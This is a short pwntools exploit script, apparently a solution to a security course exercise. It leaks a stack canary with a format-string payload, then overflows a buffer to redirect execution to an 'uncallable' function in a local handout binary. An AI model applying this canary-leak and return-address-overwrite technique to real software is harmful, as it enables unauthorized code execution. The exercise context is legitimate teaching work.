#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise5/exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
r = start()

r.recvline()
msg = 7 * '%09x '.encode()

r.sendline(msg)
received = r.recvline()
received = received.split()
canary = int(received[6], 16)
canary = p32(canary)

e = ELF(exe)
msg = 256 * b'1' + canary + 8 * b'\x9f' + p32(e.symbols['uncallable'])
r.sendline(msg)
for i in range(3):
    r.recvline()

print(r.recvline())